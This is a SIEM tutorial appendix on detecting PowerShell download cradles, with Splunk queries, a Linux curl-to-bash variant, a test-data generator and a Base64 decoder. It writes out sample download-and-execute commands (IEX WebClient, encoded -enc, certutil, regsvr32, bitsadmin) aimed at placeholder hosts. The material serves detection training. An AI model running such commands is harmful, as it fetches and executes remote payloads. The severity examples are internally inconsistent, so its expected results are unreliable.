# Appendix B: Splunk (SPL) 

### Rule: Suspicious PowerShell Download via WebClient

*(This expands the version built and tuned live in Part 4 — compiled from the Sigma source of truth after the operator-precedence bug fix — into a full production-grade reference: real-world context, obfuscation/encoding detection, severity tiering, a Linux cross-platform variant, a complete investigation playbook including a command-decoding tool, and automated containment guidance.)*

---

## B.0 — Why This Rule Exists: The Real-World Pattern

**The Concept:** Think of PowerShell like a building's master key — it can open every door, which is exactly why facilities staff need it, and exactly why a thief who steals one is so dangerous. Attackers don't need to bring their own tools onto a victim's machine; Windows already ships PowerShell everywhere. This is the essence of **"living off the land"**: using the target's *own trusted software* against it, so security tools that only watch for "known bad files" see nothing unusual — just `powershell.exe`, a program that's supposed to be there.

This exact pattern — a script or macro spawning PowerShell, which then reaches out and downloads a second-stage payload — is one of the most consistently observed initial-execution techniques across widely documented threat campaigns:

| Campaign / Actor | Pattern Observed |
|---|---|
| **Emotet** (malspam-distributed downloader, active across multiple years) | Malicious Word macros spawn `powershell.exe`, which uses `Net.WebClient` or `Invoke-WebRequest` to pull a second-stage payload from a rotating list of compromised legitimate websites — precisely the shape this rule targets. |
| **Netwalker ransomware** (documented in incident response reporting, 2020) | Operators used heavily **obfuscated, Base64-encoded** PowerShell (`-EncodedCommand`) to reflectively load ransomware DLLs directly into memory, avoiding ever writing the payload to disk. |
| **FIN7** (documented extensively by threat intel vendors) | Known for combining legitimate-looking parent processes with heavily obfuscated PowerShell one-liners specifically designed to evade naive keyword-matching rules — the reason this appendix goes beyond simple string matching in B.3. |

**The lesson these patterns teach directly:** a rule that only looks for `Net.WebClient` in plain text (Appendix B's original, and Part 4's Sigma source) will catch the *unsophisticated* version of this attack — but a even a slightly more careful attacker Base64-encodes the command, defeating plain-text keyword matching entirely. This expanded appendix builds the detection logic to catch that evasion directly, rather than assuming attackers will always be this considerate.

---

## B.1 — Full MITRE ATT&CK Context

**The Concept:** As with Appendix A, one technique ID is a single frame from a longer film. Placing T1059.001 into its surrounding chain tells you what to hunt for immediately before and after this alert fires.

| Stage | Technique | ID | Relevance to This Rule |
|---|---|---|---|
| Prerequisite | Phishing: Spearphishing Attachment | T1566.001 | The most common real-world trigger — a malicious Office macro is what actually spawns the first `powershell.exe` process this rule observes. |
| **This Rule** | **Command and Scripting Interpreter: PowerShell** | **T1059.001** | The download-cradle execution itself. |
| Frequently paired with | Obfuscated Files or Information | T1027 | Base64 encoding (`-EncodedCommand`), string concatenation, and backtick-splitting are all T1027 techniques used specifically to defeat rules like this one's original plain-text version. |
| Directly enabled by this event | Ingress Tool Transfer | T1105 | The actual payload download — this rule detects the *mechanism* (PowerShell + WebClient), while T1105 describes the *outcome* (a new file/tool now present on the host). |
| Likely next step | Command and Control | T1071 | The downloaded second stage frequently establishes its own C2 channel — the URL captured in this rule's `CommandLine` field is often the single best pivot point for a domain/IP-based hunt across the rest of your environment. |

**Key insight for detection engineers:** this rule sits *before* a file even exists on disk in many "fileless" attack chains (Netwalker's reflective loading being the clearest example) — meaning this may be your **only** opportunity to catch the intrusion via a traditional antivirus/EDR file-scanning approach, since there is sometimes no malicious file to scan at all.

---

## B.2 — Severity Tiering Model

**The Concept:** Just as Appendix A tiered MFA fatigue by burst intensity, we tier this rule by **how hard the attacker is trying to hide** — a plain-text `Net.WebClient` call is the equivalent of someone whispering their crime in a crowded room; a Base64-encoded, hidden-window command with a raw IP address is closer to a written confession in invisible ink. The harder someone works to hide something, the more suspicious the *effort itself* is, independent of what it turns out to say.

| Tier | Condition | Rationale |
|---|---|---|
| **Low** | Plain-text `Net.WebClient`/`Invoke-WebRequest`, visible window, known internal domain in URL | Matches original rule shape but targets a trusted internal resource — likely legitimate automation missing from the exception list |
| **Medium** | Plain-text download cradle, from an untrusted/external URL, visible window | The original Appendix B rule's core shape |
| **High** | `-WindowStyle Hidden`/`-w hidden` **AND** a download cradle present, regardless of encoding | Hidden windows have essentially no legitimate justification for interactive admin work — a strong standalone signal |
| **Critical** | `-EncodedCommand`/`-enc` present **AND** the decoded payload (B.8's decoder) contains a download cradle **AND** the URL is a raw IP address (not a domain name) | Matches the Netwalker/FIN7 pattern directly — active obfuscation plus a raw-IP callback is very rarely legitimate |

---

## B.3 — Enriched Detection Query (Obfuscation + Encoding + Severity)

**The Target:** `powershell_download_detection_enriched.spl` — extends Part 4's compiled Sigma output with encoded-command detection, hidden-window detection, an obfuscation heuristic, and B.2's severity tiers.

**The Implementation:**

**File: `siem-mastery-series/reference/appendix-b/powershell_download_detection_enriched.spl`**

```spl
index=windows_logs sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
Image="*powershell.exe"
| eval cmd_lower=lower(CommandLine)
" Expanded download-cradle list: the original rule only covered WebClient
" and Invoke-WebRequest/iwr. Real attackers also routinely use these
" additional native download mechanisms, all of which leave no file on
" disk until the download itself completes.
| eval has_download_cradle=if(
    match(cmd_lower, "net\.webclient") OR
    match(cmd_lower, "downloadfile") OR
    match(cmd_lower, "downloadstring") OR
    match(cmd_lower, "invoke-webrequest") OR
    match(cmd_lower, "\biwr\b") OR
    match(cmd_lower, "invoke-restmethod") OR
    match(cmd_lower, "\birm\b") OR
    match(cmd_lower, "start-bitstransfer"),
    1, 0)
" -EncodedCommand / -enc: PowerShell accepts this flag followed by a
" Base64-encoded, UTF-16LE string -- attackers use it specifically to
" defeat plain-text keyword matching against CommandLine.
| eval has_encoded_command=if(match(cmd_lower, "-enc(odedcommand)?\s+[a-z0-9+/=]{20,}"), 1, 0)
" Hidden window: -w hidden / -windowstyle hidden suppresses the visible
" PowerShell console -- legitimate interactive admin work has no reason
" to hide its own window from the very admin running it.
| eval has_hidden_window=if(match(cmd_lower, "-w(indowstyle)?\s+hidden"), 1, 0)
" Obfuscation heuristic: counts common string-splitting/concatenation
" techniques (backticks, char-code construction) used to break up
" recognizable keywords like "webclient" into unrecognizable fragments.
| eval backtick_count=mvcount(split(CommandLine, "`")) - 1
| eval has_char_obfuscation=if(match(cmd_lower, "\[char\]\d+"), 1, 0)
| eval obfuscation_score=backtick_count + (has_char_obfuscation * 3) + (has_encoded_command * 5)
" Raw-IP callback: a URL target that is an IP address rather than a
" domain name is a meaningfully stronger signal than a named domain,
" since legitimate internal tooling almost always references hostnames.
| eval targets_raw_ip=if(match(CommandLine, "https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"), 1, 0)
" Same tuning exceptions carried forward from Part 4's Sigma filter block --
" admin tooling and machine/service accounts.
| eval is_known_admin_tool=if(
    match(ParentImage, "(?i)powershell_ise\.exe$") OR
    match(ParentImage, "(?i)ConfigurationManager\.exe$") OR
    match(User, "\$$"),
    1, 0)
| where has_download_cradle=1 AND is_known_admin_tool=0
| eval severity=case(
    has_encoded_command=1 AND targets_raw_ip=1, "Critical",
    has_hidden_window=1, "High",
    has_download_cradle=1 AND targets_raw_ip=0 AND has_hidden_window=0 AND has_encoded_command=0, "Medium",
    true(), "Low"
  )
| table _time, host, User, ParentImage, Image, CommandLine, has_encoded_command, has_hidden_window, obfuscation_score, targets_raw_ip, severity
| sort - severity
```

**The Verification:** Run this against Part 4's test dataset (`siem-lab-sigma` index) first to confirm it still correctly matches the `malicious` scenario at **Medium** severity (plain-text `Net.WebClient`, no hidden window, no encoding) and still correctly excludes `ise_admin` and `service_account`. Then proceed to B.7 to generate the expanded dataset that actually exercises the High/Critical tiers.

---

## B.4 — Cross-Platform Variant: Linux Download-and-Execute (`curl`/`wget`)

**The Concept:** T1059.001 is Windows-specific by definition (it's literally named for PowerShell), but the *behavioral pattern* — a scripting interpreter fetching and immediately running a remote payload — has a direct Linux equivalent under **T1059.004 (Unix Shell)**. This is the same pattern-transfer exercise Appendix A performed for Okta: same underlying logic, different operating system's native tooling.

**File: `siem-mastery-series/reference/appendix-b/linux_download_execute.spl`**

```spl
index=linux_logs sourcetype="linux:audit"
" auditd's execve records capture the full argv array of every executed
" command -- the Linux equivalent of Sysmon's CommandLine field.
| eval cmd_lower=lower(exe_args)
" The classic Linux "pipe to shell" download cradle: fetch a remote script
" and pipe it directly into bash/sh, meaning the script content is never
" written to disk as a discrete, scannable file -- directly analogous to
" the Windows Net.WebClient.DownloadString pattern.
| eval has_pipe_to_shell=if(
    match(cmd_lower, "curl.*\|\s*(bash|sh)") OR
    match(cmd_lower, "wget.*-o-.*\|\s*(bash|sh)") OR
    match(cmd_lower, "curl.*\|\s*sudo\s+(bash|sh)"),
    1, 0)
| where has_pipe_to_shell=1
| eval attack_pattern="Linux Download-and-Execute (T1059.004)"
| table _time, host, user, exe_args, attack_pattern
```

**Tuning note specific to this variant:** legitimate software installation instructions (Docker, Homebrew, various DevOps tools) famously use exactly this `curl ... | bash` pattern as their official install method — meaning this variant will have a **much higher false-positive rate** than its Windows counterpart in developer-heavy environments. Scope this rule to production/server hosts first, and maintain an explicit allowlist of approved installer domains before deploying broadly to developer workstations.

---

## B.5 — Expanded Tuning & False Positive Playbook

**The Concept:** Appendix B's original tuning covered two exceptions (PowerShell ISE, ConfigMgr). A production environment has far more legitimate automation that looks superficially identical to this attack pattern — the same principle as Appendix A.5, applied to endpoint automation instead of identity.

| False Positive Category | Root Cause | Recommended Handling |
|---|---|---|
| **Software deployment tools** (SCCM/ConfigMgr, Intune, Ansible, Chocolatey) | Legitimately use PowerShell + WebClient/Invoke-WebRequest to pull packages from internal or vendor repositories | Exclude by `ParentImage` (already done for ConfigMgr) or by destination URL domain allowlist — never by removing the download-cradle keywords themselves |
| **CI/CD pipeline runners** (Azure DevOps agents, GitHub Actions self-hosted runners) | Build agents routinely download build tools/dependencies via PowerShell as part of normal pipeline execution | Exclude by the specific runner service account (`User` field), documented and reviewed like any other exception |
| **PowerShell Desired State Configuration (DSC) / profile scripts** | Some organizations' logon scripts use `Invoke-WebRequest` to pull configuration files at every login | Exclude by matching the specific, known configuration-file URL pattern rather than the technique broadly |
| **Legitimate use of `-EncodedCommand`** | Windows itself uses `-EncodedCommand` internally for passing complex arguments through certain scheduled-task and remoting scenarios (e.g., some WinRM invocations) | Do not treat `has_encoded_command=1` alone as automatically Critical — B.3's severity model requires it **combined with** a raw-IP target, specifically to reduce this false-positive class |
| **Internal package mirrors** | Organizations running internal PyPI/NuGet/Chocolatey mirrors will show download-cradle activity against internal, not external, IPs/domains | Maintain an internal-domain allowlist; do not exclude by IP range alone, since `targets_raw_ip` is checking for *raw IPs specifically*, not internal vs. external — combine both checks if your internal mirrors are also referenced by IP |

**Never do this:** remove `has_encoded_command` from the detection logic to reduce noise. Base64-encoded PowerShell is one of the single strongest indicators of deliberate evasion in this entire rule — if it's noisy, tighten the *combination* condition (as B.3 already does with `targets_raw_ip`), don't discard the signal.

---

## B.6 — Expanded Raw Log Samples

**The Concept:** Appendix B's original sample only covered the simplest, plain-text case. A mature rule must be validated against every technique real attackers actually use to evade it.

**Base64-encoded command (Netwalker-style, decodes to a download cradle):**
```json
{
  "@timestamp": "2024-07-15T02:14:00.000Z",
  "winlog": {
    "event_id": 1,
    "computer_name": "WIN-FILE02.corp.local",
    "event_data": {
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA5ADkALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
      "ParentImage": "C:\\Windows\\System32\\wscript.exe",
      "User": "CORP\\svc_finance"
    }
  }
}
```
*(This decodes — see B.8's tool — to `IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.99/payload.ps1')`, identical in intent to the original Appendix B sample, but invisible to any rule that only string-matches plain-text `CommandLine`.)*

**BITS transfer variant (a download mechanism that avoids `Net.WebClient` entirely):**
```json
{
  "@timestamp": "2024-07-15T03:00:00.000Z",
  "winlog": {
    "event_id": 1,
    "computer_name": "WIN-WEB03.corp.local",
    "event_data": {
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell.exe -c \"Start-BitsTransfer -Source 'http://198.51.100.44/update.exe' -Destination 'C:\\Windows\\Temp\\update.exe'\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "User": "CORP\\jdoe"
    }
  }
}
```

**`certutil.exe` LOLBin download (not PowerShell at all — the same evasive intent via a different living-off-the-land binary):**
```json
{
  "@timestamp": "2024-07-15T04:30:00.000Z",
  "winlog": {
    "event_id": 1,
    "computer_name": "WIN-DC01.corp.local",
    "event_data": {
      "Image": "C:\\Windows\\System32\\certutil.exe",
      "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.99/tool.exe C:\\Users\\Public\\tool.exe",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "User": "CORP\\jdoe"
    }
  }
}
```
> **Why this matters:** this event will **never** match this rule as written, since `Image` isn't `powershell.exe` at all. This is included deliberately to show a real scope limitation (see B.11's LOLBin reference table) — a mature detection program needs a *sibling* rule specifically for `certutil.exe`-based downloads, not an assumption that "the PowerShell rule covers downloads."

---

## B.7 — Expanded Test Dataset (6 Scenarios)

**The Target:** Extends Part 4's 4-event test dataset with scenarios that exercise B.2's High and Critical severity tiers.

**File: `siem-mastery-series/reference/appendix-b/generate_sigma_test_dataset_expanded.py`**

```python
"""
generate_sigma_test_dataset_expanded.py

Extends Part 4's 4-scenario test dataset to 6 scenarios, specifically
exercising the severity tiers built in B.2/B.3:

  1. malicious        - plain-text WebClient, visible window (Medium, from Part 4)
  2. ise_admin        - filtered by ParentImage exception (from Part 4)
  3. service_account  - filtered by User "$" exception (from Part 4)
  4. benign_unrelated - no match at all, sanity control (from Part 4)
  5. hidden_encoded   - Base64-encoded, hidden window, raw IP target (Critical)
  6. hidden_only      - plain-text cradle, hidden window, but a real domain (High)
"""
import base64
import json
from pathlib import Path

OUTPUT_DIR = Path(__file__).parent


def encode_powershell_command(plain_command: str) -> str:
    """PowerShell's -EncodedCommand expects Base64 over UTF-16LE bytes --
    NOT plain UTF-8 Base64. Getting this encoding wrong is the #1 reason
    a hand-rolled test payload fails to decode correctly later in B.8."""
    utf16le_bytes = plain_command.encode("utf-16-le")
    return base64.b64encode(utf16le_bytes).decode("ascii")


hidden_encoded_plain_cmd = (
    "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.99/payload.ps1')"
)
hidden_encoded_b64 = encode_powershell_command(hidden_encoded_plain_cmd)

EVENTS = [
    {
        "id": "malicious",
        "host": "WIN-WEB03.corp.local", "user": "CORP\\jdoe",
        "parent_image": "C:\\Windows\\System32\\cmd.exe",
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.99/payload.ps1')\"",
    },
    {
        "id": "ise_admin",
        "host": "WIN-ADMIN01.corp.local", "user": "CORP\\netadmin",
        "parent_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe",
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": "powershell.exe -c \"(New-Object Net.WebClient).DownloadFile('http://intranet.corp.local/tools/patch.exe','C:\\Temp\\patch.exe')\"",
    },
    {
        "id": "service_account",
        "host": "WIN-FILE02.corp.local", "user": "CORP\\SVC01$",
        "parent_image": "C:\\Windows\\System32\\services.exe",
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": "powershell.exe -c \"Invoke-WebRequest -Uri http://intranet.corp.local/agent/update.zip -OutFile update.zip\"",
    },
    {
        "id": "benign_unrelated",
        "host": "WIN-WEB03.corp.local", "user": "CORP\\jdoe",
        "parent_image": "C:\\Windows\\explorer.exe",
        "image": "C:\\Windows\\System32\\notepad.exe",
        "command_line": "notepad.exe C:\\Users\\jdoe\\Desktop\\notes.txt",
    },
    {
        # CRITICAL tier: encoded + hidden window + raw IP target once decoded.
        "id": "hidden_encoded",
        "host": "WIN-FILE02.corp.local", "user": "CORP\\svc_finance",
        "parent_image": "C:\\Windows\\System32\\wscript.exe",
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": f"powershell.exe -nop -w hidden -enc {hidden_encoded_b64}",
    },
    {
        # HIGH tier: hidden window, plain-text cradle, but a named domain
        # (not a raw IP) -- tests that hidden window alone is enough for
        # High severity even without the Critical-tier encoding+IP combo.
        "id": "hidden_only",
        "host": "WIN-WEB03.corp.local", "user": "CORP\\jdoe",
        "parent_image": "C:\\Windows\\System32\\cmd.exe",
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": "powershell.exe -w hidden -c \"Invoke-WebRequest -Uri http://staging-updates.example.com/agent.exe -OutFile agent.exe\"",
    },
]


def write_ecs_ndjson(path: Path) -> None:
    with path.open("w") as f:
        for ev in EVENTS:
            action_line = {"index": {"_index": "siem-lab-sigma-expanded", "_id": ev["id"]}}
            source_doc = {
                "@timestamp": "2024-07-15T10:00:00Z",
                "host": {"name": ev["host"]},
                "user": {"name": ev["user"]},
                "process": {
                    "executable": ev["image"],
                    "command_line": ev["command_line"],
                    "parent": {"executable": ev["parent_image"]},
                },
            }
            f.write(json.dumps(action_line) + "\n")
            f.write(json.dumps(source_doc) + "\n")


if __name__ == "__main__":
    write_ecs_ndjson(OUTPUT_DIR / "dataset_ecs_expanded.ndjson")
    print(f"Wrote {len(EVENTS)} test events (6 scenarios) to dataset_ecs_expanded.ndjson")
    print(f"\nEncoded command for 'hidden_encoded' scenario (for manual B.8 decode practice):")
    print(hidden_encoded_b64)
```

Run it:

```bash
mkdir -p ../reference/appendix-b
python3 generate_sigma_test_dataset_expanded.py
```

**The Verification:**

```
Wrote 6 test events (6 scenarios) to dataset_ecs_expanded.ndjson

Encoded command for 'hidden_encoded' scenario (for manual B.8 decode practice):
SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA5ADkALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==
```

Load into Splunk against a new `siem_lab_sigma_expanded` index (same upload steps as Part 4, Step 4.5), and run B.3's enriched query. Expected results:

| CommandLine (abridged) | has_encoded_command | has_hidden_window | targets_raw_ip | severity |
|---|---|---|---|---|
| `-enc SQBFAFgA...` (hidden_encoded) | 1 | 1 | 1 *(after decode, see B.8)* | **Critical** |
| `-w hidden -c "Invoke-WebRequest ... staging-updates.example.com"` (hidden_only) | 0 | 1 | 0 | **High** |
| `-w hidden -c "IEX (New-Object Net.WebClient)..."` (malicious) | 0 | 1 | 1 | **High** *(note: B.3's raw CommandLine regex can see the IP directly in plain text here — only the encoded scenario requires the decoder in B.8)* |

> **Note on `hidden_encoded`'s `targets_raw_ip` field:** B.3's `targets_raw_ip` regex runs against the *raw* `CommandLine`, which for this scenario is still Base64 text — it cannot see the IP address hidden inside the encoded blob without first decoding it. This is intentional and leads directly into B.8: **detecting** that a command is encoded (which B.3 does) and **decoding** it to inspect its true contents (which requires the tool below) are two separate steps, and a real investigation always needs both.

---

## B.8 — SOC Investigation Playbook (with a Real Decoder Tool)

**The Concept:** An analyst who sees `severity: Critical` and a wall of Base64 text has to answer one question immediately: *what does this actually say?* Just like a locksmith called to a break-in needs to know what was actually stolen, not just that the lock was picked. We build a genuine, working decoder — this is not a conceptual placeholder, it's the exact tool an analyst would run.

**File: `siem-mastery-series/reference/appendix-b/decode_encoded_powershell.py`**

```python
"""
decode_encoded_powershell.py

Decodes a PowerShell -EncodedCommand / -enc Base64 blob back into readable
plain text, for use during investigation of alerts flagged by
powershell_download_detection_enriched.spl (B.3).

PowerShell's -EncodedCommand always encodes the UTF-16LE byte representation
of the command, NOT plain UTF-8 -- decoding with the wrong text encoding
produces garbled, unreadable output, which is the single most common mistake
analysts make when doing this by hand.

Usage:
    python3 decode_encoded_powershell.py "SQBFAFgAIAAoAE4Ae..."
"""
import base64
import sys


def decode_encoded_command(b64_blob: str) -> str:
    # Strip any surrounding whitespace/quotes an analyst might paste in
    # accidentally from a log viewer or ticketing system.
    cleaned = b64_blob.strip().strip('"').strip("'")
    raw_bytes = base64.b64decode(cleaned)
    # PowerShell encodes commands as UTF-16LE -- decoding as UTF-8 here
    # would raise a UnicodeDecodeError or silently produce garbage text.
    return raw_bytes.decode("utf-16-le")


def extract_urls(decoded_command: str) -> list[str]:
    import re
    return re.findall(r"https?://[^\s'\"]+", decoded_command)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 decode_encoded_powershell.py <base64_blob>", file=sys.stderr)
        sys.exit(1)

    try:
        decoded = decode_encoded_command(sys.argv[1])
    except Exception as exc:
        print(f"Error decoding command: {exc}", file=sys.stderr)
        print("Tip: confirm you copied the FULL base64 blob with no truncation.", file=sys.stderr)
        sys.exit(1)

    print("--- DECODED COMMAND ---")
    print(decoded)

    urls = extract_urls(decoded)
    if urls:
        print("\n--- EXTRACTED URLS (pivot these against threat intel / DNS logs) ---")
        for url in urls:
            print(f"  {url}")
```

**The Verification:**

```bash
python3 decode_encoded_powershell.py "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA5ADkALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA=="
```

Expected output:

```
--- DECODED COMMAND ---
IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.99/payload.ps1')

--- EXTRACTED URLS (pivot these against threat intel / DNS logs) ---
  http://203.0.113.99/payload.ps1
```

This confirms `hidden_encoded`'s true target is a raw IP address, validating B.7's **Critical** tier classification wasn't a guess — it's now verified.

**Full investigation playbook, in order:**

1. **Decode any `-EncodedCommand`/`-enc` payload** using the tool above before doing anything else — never triage an encoded alert based on the Base64 text alone.
2. **Extract and pivot on any URLs/IPs** found in the decoded command — check them against your threat intelligence platform, and search your DNS/proxy logs for any *other* hosts that resolved or connected to the same indicator (a single decoded IP often reveals the same payload was pulled by multiple compromised hosts).
3. **Check the parent process chain** (`ParentImage`) for how PowerShell was launched in the first place — a Word/Excel process (`WINWORD.EXE`/`EXCEL.EXE`) as the grandparent strongly suggests a malicious macro (T1566.001), which should trigger a parallel investigation of the original email/attachment.
4. **Check whether the downloaded payload actually executed** — search subsequent Sysmon Event ID 1 records on the same host, filtering for any new process whose `ParentImage` is `powershell.exe`, within the following few minutes.
5. **If confirmed malicious:** isolate the host immediately (B.9), collect a memory image if reflective/fileless loading is suspected (Netwalker-style), and rotate any credentials that were active on that host at the time.

---

## B.9 — Automated Response (SOAR Playbook Sketch)

**The Concept:** For **Critical**-tier alerts (B.2), the priority is stopping any further payload execution or C2 communication *immediately* — every second the host stays connected to the network is a second the second-stage payload can act.

**File: `siem-mastery-series/reference/appendix-b/soar_playbook_sketch.md`**

```markdown
# Automated Response Playbook: Critical PowerShell Download Alert

Trigger: powershell_download_detection_enriched.spl produces a row with severity == "Critical"

Automated actions (via SOAR platform / EDR API integration, executed within
seconds of the alert):
1. Isolate the host from the network at the EDR/endpoint agent level
   (network isolation, NOT full shutdown -- preserves memory for forensics)
2. Kill the specific powershell.exe process ID that triggered the alert
   (targeted process termination, not a blanket "kill all PowerShell" action,
   which would disrupt legitimate concurrent administrative work)
3. Snapshot running processes and network connections on the host BEFORE
   isolation completes, for later forensic comparison
4. Auto-decode the -EncodedCommand blob (using B.8's tool, wired into the
   SOAR platform's scripting step) and post the decoded command + any
   extracted URLs to the #soc-critical channel immediately
5. Query DNS/proxy logs across the ENTIRE environment for any other host
   that resolved/connected to the same extracted URL/IP in the last 24h,
   and flag those hosts for analyst review (they may be compromised too)

Explicitly OUT of scope for automation (human judgment required):
- Full host reimage/rebuild decisions
- Broader network segment isolation beyond the single affected host
- Law enforcement or legal escalation
```

Same disclaimer as Appendix A.9: this is a requirements sketch for your own SOAR/EDR integration, not portable runnable code — the specific API calls depend entirely on your endpoint security vendor.

---

## B.10 — Rule Health Metrics

| Metric | How to Calculate | Healthy Target |
|---|---|---|
| **True Positive Rate** | Confirmed-malicious alerts ÷ total alerts (logged via B.8's Step 5 outcome) | Track trend; rising over time indicates tuning (B.5) is working |
| **Encoded-Command Decode Success Rate** | % of `has_encoded_command=1` alerts successfully decoded by B.8's tool without error | Should be ~100% — decode failures usually mean a non-standard encoding variant worth investigating on their own |
| **Severity Distribution Drift** | Month-over-month count of alerts per tier | A sudden shift toward Critical-tier alerts across many hosts may indicate a live, organization-wide campaign rather than isolated incidents |
| **Exception List Staleness** | Days since each `ParentImage`/`User` exception (B.5) was last reviewed | 0 entries older than 90 days |
| **LOLBin Coverage Gap** | # of confirmed incidents where the payload used a non-PowerShell LOLBin (certutil, mshta, regsvr32) that this rule structurally cannot see | Any nonzero count is a prioritized backlog item for a sibling rule (see B.11) |

---

## B.11 — Reference Tables

### PowerShell Obfuscation Techniques Relevant to This Rule

| Technique | Example | Why Attackers Use It |
|---|---|---|
| Base64 encoding (`-EncodedCommand`) | `-enc SQBFAFgA...` | Defeats plain-text keyword matching against `CommandLine` entirely |
| Backtick insertion | `Net.We``bClient` | Breaks up recognizable strings without changing PowerShell's parsing behavior |
| Character-code construction | `[char]78+[char]101+[char]116` builds `"Net"` | Avoids the literal string ever appearing anywhere in the command |
| String concatenation/reordering | `('Web'+'Client')` | Same goal as backtick insertion, different mechanism |
| Case randomization | `nEt.WeBcLiEnT` | Defeats case-sensitive matching (mitigated here by our `lower()` normalization in B.3) |

### Common LOLBins Used for Downloads (Beyond PowerShell)

*(Included so you know exactly what this rule does **not** cover — each row below is a strong candidate for its own sibling Sigma/SPL rule, following the exact same `selection`/`filter`/`condition` pattern from Part 4.)*

| Binary | Example Command | MITRE ATT&CK |
|---|---|---|
| `certutil.exe` | `certutil -urlcache -split -f http://x/y.exe y.exe` | T1105 via T1218.006 (System Binary Proxy Execution) |
| `mshta.exe` | `mshta http://x/payload.hta` | T1218.005 |
| `regsvr32.exe` (the "Squiblydoo" technique) | `regsvr32 /s /n /u /i:http://x/payload.sct scrobj.dll` | T1218.010 |
| `bitsadmin.exe` | `bitsadmin /transfer job /download /priority high http://x/y.exe y.exe` | T1197 (BITS Jobs) |
| `curl.exe` (native on modern Windows 10+) | `curl.exe http://x/y.exe -o y.exe` | T1105 |

### Azure AD / Windows Encoding Reference for This Rule

| Encoding Concept | Detail |
|---|---|
| `-EncodedCommand` byte encoding | Always UTF-16LE, never UTF-8 — see B.8's decoder |
| Minimum realistic Base64 length for a meaningful command | ~20 characters (B.3's regex threshold) — shorter matches are usually incidental, not real encoded commands |
| PowerShell's short flag form | `-enc` is accepted as an abbreviation of `-EncodedCommand` — both must be checked (B.3's regex handles both via `-enc(odedcommand)?`) |

---

## B.12 — Consolidated File Tree for This Appendix

```
siem-mastery-series/
└── reference/
    └── appendix-b/
        ├── powershell_download_detection_enriched.spl
        ├── linux_download_execute.spl
        ├── generate_sigma_test_dataset_expanded.py
        ├── dataset_ecs_expanded.ndjson
        ├── decode_encoded_powershell.py
        └── soar_playbook_sketch.md
```
